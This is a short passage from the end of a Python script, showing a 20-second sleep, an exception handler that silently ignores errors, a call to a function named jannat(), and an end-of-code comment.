		time.sleep(20)
	except Exception as e:
		pass

jannat()
#-----------Code Stop------------#